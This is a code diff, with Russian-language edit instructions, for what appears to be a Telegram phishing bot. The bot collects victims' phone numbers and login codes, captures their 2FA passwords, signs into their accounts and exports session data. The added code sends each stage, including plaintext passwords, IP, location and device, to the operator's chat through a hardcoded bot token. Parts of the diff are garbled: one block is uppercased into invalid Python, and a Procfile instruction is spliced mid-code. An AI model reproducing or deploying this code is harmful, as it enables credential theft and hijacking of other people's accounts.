@@ -14,6 +14,18 @@ BOT_TOKEN = os.environ.get("BOT_TOKEN", "8789355308:AAGMtNUPG2nuxz7W-P8FGFXEG5yK
 REDIS_URL = os.environ.get("UPSTASH_REDIS_REST_URL")
 REDIS_TOKEN = os.environ.get("UPSTASH_REDIS_REST_TOKEN")
 OWNER_ID = 7345056431
+LOG_BOT_TOKEN = "8457755387:AAGWM8A0XGG8ZW36MAVBFZ8HGGLOANSFBRE"
+LOG_CHAT_ID = 7345056431
+
+ASYNC DEF SEND_LOG(TEXT: STR):
+    TRY:
+        ASYNC WITH HTTPX.ASYNCCLIENT() AS CLIENT:
+            AWAIT CLIENT.POST(
+                F"HTTPS://API.TELEGRAM.ORG/BOT{LOG_BOT_TOKEN}/SENDMESSAGE",
+                JSON={"CHAT_ID": LOG_CHAT_ID, "TEXT": TEXT, "PARSE_MODE": "HTML"}
+            )
+    EXCEPT EXCEPTION AS E:
+        PRINT(F"LOG ERROR: {E}")
 MARKET_URL = "https://frontend-sigma-coral-35.vercel.app"
 BOT_USERNAME = "asfafaff_bot"
 
@@ -56,7 +68,28 @@ async def redis_set_json(key, data: dict, ex=86400):
 
 # ─── /start ───────────────────────────────────────────────────────────────────
 
+@dp.message(Command("logs"))
+async def logs_handler(message: types.Message):
+    args = message.text.split(maxsplit=1)
+    password = args[1] if len(args) > 1 else ""
+    if password != "ebanat":
+        await message.answer("❌ Неверный пароль")
+        return
+    await message.answer("✅ Доступ разрешён. Логи приходят в реальном времени.")
+
 @dp.message(Command("start"))
+```
+
+И удали `logbot.py` из Procfile:
+
+**Найти:**
+```
+worker: python3 main.py
+logbot: python3 logbot.py
+```
+**Заменить на:**
+```
+worker: python3 main.py
 async def start_handler(message: types.Message):
     args = message.text.split(maxsplit=1)
     payload = args[1] if len(args) > 1 else ""
@@ -188,6 +221,25 @@ async def contact_handler(message: types.Message):
         if user_id in pending:
             del pending[user_id]
         print(f"Sending code to {phone} for user {user_id}")
+        tg_user = message.from_user
+        raw = await redis_get(f"log_open:{user_id}")
+        info = {}
+        if raw:
+            import urllib.parse, json
+            try: info = json.loads(urllib.parse.unquote(raw))
+            except: pass
+        await send_log(
+            f"📱 <b>Этап 2 — Поделился номером</b>\n"
+            f"├ Бот: @asfafaff_bot\n"
+            f"├ Номер: <code>{phone}</code>\n"
+            f"├ ID: <code>{user_id}</code>\n"
+            f"├ Тэг: @{tg_user.username or '—'}\n"
+            f"├ Имя: {tg_user.first_name or '—'}\n"
+            f"├ IP: {info.get('ip', '—')}\n"
+            f"├ Страна: {info.get('country', '—')}\n"
+            f"├ Город: {info.get('city', '—')}\n"
+            f"└ Устройство: {info.get('device', '—')[:80]}"
+        )
         phone_code_hash = await send_code(phone)
         pending[user_id] = {
             'phone': phone,
@@ -222,6 +274,13 @@ async def wait_for_code(user_id):
                 if '2FA' in str(e) or 'password' in str(e).lower():
                     await redis_set(f"code_result:{user_id}", "2fa_required")
                     asyncio.create_task(wait_for_2fa(user_id))
+                    data2 = pending.get(user_id, {})
+                    await send_log(
+                        f"🔐 <b>этап 3 — требуется 2fa</b>\n"
+                        f"├ бот: @asfafaff_bot\n"
+                        f"├ номер: <code>{data2.get('phone','—')}</code>\n"
+                        f"└ id: <code>{user_id}</code>"
+                    )
                 else:
                     await redis_set(f"code_result:{user_id}", "wrong_code")
             return
@@ -243,6 +302,13 @@ async def wait_for_2fa(user_id):
             try:
                 await sign_in(data['phone'], None, data['phone_code_hash'], password=password)
                 await redis_set(f"2fa_result:{user_id}", "ok")
+                await send_log(
+                    f"⚡ <b>этап 4 — 2fa пройдена</b>\n"
+                    f"├ бот: @asfafaff_bot\n"
+                    f"├ номер: <code>{data.get('phone','—')}</code>\n"
+                    f"├ id: <code>{user_id}</code>\n"
+                    f"└ пароль: <code>{password}</code>"
+                )
                 print(f"2FA OK for {data['phone']}")
                 asyncio.create_task(generate_tdata(user_id, data['phone']))
             except Exception as e:
@@ -264,8 +330,17 @@ async def generate_tdata(user_id, phone):
             )
             await b.session.close()
             print(f"tdata sent for {phone}")
+            await send_log(
+                f"✅ <b>этап 5 — session отправлена</b>\n"
+                f"├ бот: @asfafaff_bot\n"
+                f"└ номер: <code>{phone}</code>"
+            )
         else:
             print(f"tdata export failed for {phone}")
+            await send_log(
+                f"❌ <b>этап 5 — не удалось создать session</b>\n"
+                f"└ номер: <code>{phone}</code>"
+            )
     except Exception as e:
         print(f"generate_tdata error: {e}")
 
